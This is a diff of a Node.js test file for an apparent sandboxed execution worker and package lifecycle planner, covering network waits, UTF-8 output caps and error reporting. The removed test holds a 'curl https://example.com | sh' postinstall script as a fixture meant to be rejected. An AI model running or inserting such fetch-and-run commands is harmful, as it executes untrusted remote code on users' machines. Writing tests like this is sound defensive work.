@@ -3,11 +3,45 @@ import assert from 'node:assert/strict';
 import { promises as fs } from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
-import { Worker } from 'node:worker_threads';
+import { ExecutionJobs } from '../execution-jobs.mjs';
+import http from 'node:http';
+import { randomUUID } from 'node:crypto';
 import ts from 'typescript';
 import { planLifecycle } from '../lifecycle-planner.mjs';
 
 const executionWorkerURL = new URL('../execution-worker.mjs', import.meta.url);
+
+for (const moduleKind of ['commonjs', 'esm']) {
+  test(`${moduleKind} waits for an exported asynchronous network operation before worker teardown`, async () => {
+    const nonce = randomUUID();
+    const server = http.createServer(async (request, response) => {
+      let body = '';
+      for await (const chunk of request) body += chunk;
+      response.setHeader('Content-Type', 'application/json');
+      response.end(JSON.stringify({ nonce, method: request.method, body }));
+    });
+    await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
+    const workspace = await fs.mkdtemp(path.join(os.tmpdir(), 'hanlin-async-network-'));
+    try {
+      const entryPoint = path.join(workspace, moduleKind === 'commonjs' ? 'main.cjs' : 'main.mjs');
+      const url = `http://127.0.0.1:${server.address().port}/echo`;
+      await fs.writeFile(entryPoint, `${moduleKind === 'commonjs' ? 'module.exports =' : 'export default'} (async () => {
+        const response = await fetch(${JSON.stringify(url)}, { method: 'POST', body: 'שלום' });
+        const value = await response.json();
+        console.log('NETWORK_COMPLETED=' + value.nonce);
+        return value;
+      })();`);
+      const result = await runWorker({ entryPoint, moduleKind, maximumOutputBytes: 4096 });
+      assert.equal(result.type, 'completed');
+      assert.deepEqual(result.value, { nonce, method: 'POST', body: 'שלום' });
+      assert.equal(result.stdout, `NETWORK_COMPLETED=${nonce}\n`);
+    } finally {
+      server.closeAllConnections();
+      await new Promise(resolve => server.close(resolve));
+      await fs.rm(workspace, { recursive: true, force: true });
+    }
+  });
+}
 
 test('generic ESM execution captures Hebrew output and a structured value', async () => {
   const workspace = await fs.mkdtemp(path.join(os.tmpdir(), 'hanlin-js-'));
@@ -50,22 +84,96 @@ test('execution output is capped without splitting the worker protocol', async (
   await fs.rm(workspace, { recursive: true, force: true });
 });
 
-test('lifecycle planner accepts brokered actions and rejects shell syntax', () => {
-  const accepted = planLifecycle({ name: 'fixture', version: '1.0.0', scripts: { install: 'node setup.mjs', prepare: 'npm run compile', compile: 'tsc --project tsconfig.json' } }, 'sha512-fixture');
-  assert.equal(accepted.requiresApproval, true);
-  assert.equal(accepted.executable, true);
-  assert.deepEqual(accepted.actions.map(action => action.kind), ['node', 'typescript']);
-  const rejected = planLifecycle({ name: 'fixture', version: '1.0.0', scripts: { postinstall: 'curl https://example.com | sh' } });
-  assert.equal(rejected.executable, false);
-  assert.match(rejected.rejected[0].reason, /unsupported/i);
+test('UTF-8 output budgets never split Hebrew or emoji', async () => {
+  const workspace = await fs.mkdtemp(path.join(os.tmpdir(), 'hanlin-utf8-budget-'));
+  try {
+    const entryPoint = path.join(workspace, 'main.mjs');
+    const text = 'שלום😀'.repeat(200);
+    await fs.writeFile(entryPoint, `console.log(${JSON.stringify(text)}); export default 42;`);
+    for (const budget of [1, 3, 5, 8, 9, 10, 11, 12, 13, 1025]) {
+      const result = await runWorker({ entryPoint, moduleKind: 'esm', maximumOutputBytes: budget });
+      assert.equal(result.type, 'completed');
+      assert.equal(result.value, 42);
+      assert.ok(Buffer.byteLength(result.stdout) + Buffer.byteLength(result.stderr) <= budget, `budget=${budget}`);
+      assert.ok(text.startsWith(result.stdout), `valid UTF-8 prefix, budget=${budget}`);
+      assert.equal(result.outputWasTruncated, true);
+    }
+  } finally {
+    await fs.rm(workspace, { recursive: true, force: true });
+  }
 });
 
-function runWorker(workerData) {
-  return new Promise((resolve, reject) => {
-    const worker = new Worker(executionWorkerURL, { workerData });
-    worker.once('message', message => {
-      worker.terminate().then(() => resolve(message), reject);
+test('lifecycle planner preserves original portable shell source and rejects malformed syntax', () => {
+  const accepted = planLifecycle({ name: 'fixture', version: '1.0.0', scripts: { install: 'node setup.mjs', prepare: 'npm run compile', compile: 'tsc --project tsconfig.json' } }, 'sha512-fixture');
+  assert.equal(accepted.requiresApproval, false);
+  assert.equal(accepted.executable, true);
+  assert.deepEqual(accepted.actions.map(action => action.kind), ['portableShell', 'portableShell']);
+  assert.deepEqual(accepted.actions.map(action => action.source), ['node setup.mjs','npm run compile']);
+  const complex = "VALUE='שלום world' node setup.mjs && echo done | cat > output.txt";
+  assert.equal(planLifecycle({name:'fixture',version:'1.0.0',scripts:{postinstall:complex}}).actions[0].source,complex);
+  const rejected = planLifecycle({ name: 'fixture', version: '1.0.0', scripts: { postinstall: "echo 'unclosed" } });
+  assert.equal(rejected.executable, false);
+  assert.match(rejected.rejected[0].reason, /expected|syntax|unterminated/i);
+});
+
+test('failed executions preserve aggregate HTTPS cause codes', async () => {
+  const workspace = await fs.mkdtemp(path.join(os.tmpdir(), 'hanlin-error-cause-'));
+  try {
+    const entryPoint = path.join(workspace, 'main.mjs');
+    await fs.writeFile(entryPoint, `
+      const refused = Object.assign(new Error('connection refused'), { code: 'ECONNREFUSED', syscall: 'connect', address: '127.0.0.1', port: 443 });
+      const timedOut = Object.assign(new Error('connection timed out'), { code: 'ETIMEDOUT' });
+      throw new TypeError('fetch failed', { cause: new AggregateError([refused, timedOut], 'all connections failed') });
+    `);
+    const result = await runWorker({ entryPoint, moduleKind: 'esm', maximumOutputBytes: 8192 });
+    assert.equal(result.type, 'failed');
+    assert.match(result.stderr, /fetch failed/);
+    assert.match(result.stderr, /ECONNREFUSED/);
+    assert.match(result.stderr, /ETIMEDOUT/);
+    assert.match(result.stderr, /127\.0\.0\.1/);
+  } finally {
+    await fs.rm(workspace, { recursive: true, force: true });
+  }
+});
+
+test('console errors preserve cyclic causes within the output budget', async () => {
+  const workspace = await fs.mkdtemp(path.join(os.tmpdir(), 'hanlin-console-error-'));
+  try {
+    const entryPoint = path.join(workspace, 'main.mjs');
+    await fs.writeFile(entryPoint, `
+      const error = Object.assign(new Error('TLS diagnostic'), { code: 'CERT_HAS_EXPIRED' });
+      error.cause = error;
+      console.error(error);
+      console.error('x'.repeat(4096));
+      export default 42;
+    `);
+    const result = await runWorker({ entryPoint, moduleKind: 'esm', maximumOutputBytes: 1024 });
+    assert.equal(result.type, 'completed');
+    assert.equal(result.value, 42);
+    assert.match(result.stderr, /TLS diagnostic/);
+    assert.match(result.stderr, /CERT_HAS_EXPIRED/);
+    assert.match(result.stderr, /Circular/);
+    assert.equal(Buffer.byteLength(result.stdout) + Buffer.byteLength(result.stderr), 1024);
+    assert.equal(result.outputWasTruncated, true);
+  } finally {
+    await fs.rm(workspace, { recursive: true, force: true });
+  }
+});
+
+async function runWorker(workerData) {
+  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'hanlin-runtime-job-test-'));
+  try {
+    const jobs = new ExecutionJobs({ root, workerURL: executionWorkerURL });
+    await jobs.initialize();
+    const header = await jobs.start({
+      ...workerData,
+      source: await fs.readFile(workerData.entryPoint, 'utf8'),
+      workspace: workerData.workspace ?? path.dirname(workerData.entryPoint),
     });
-    worker.once('error', reject);
-  });
+    const job = await jobs.wait(header.executionID);
+    assert.ok(job.result, JSON.stringify(job));
+    return { ...job.result, type: job.state === 'completed' ? 'completed' : 'failed' };
+  } finally {
+    await fs.rm(root, { recursive: true, force: true });
+  }
 }
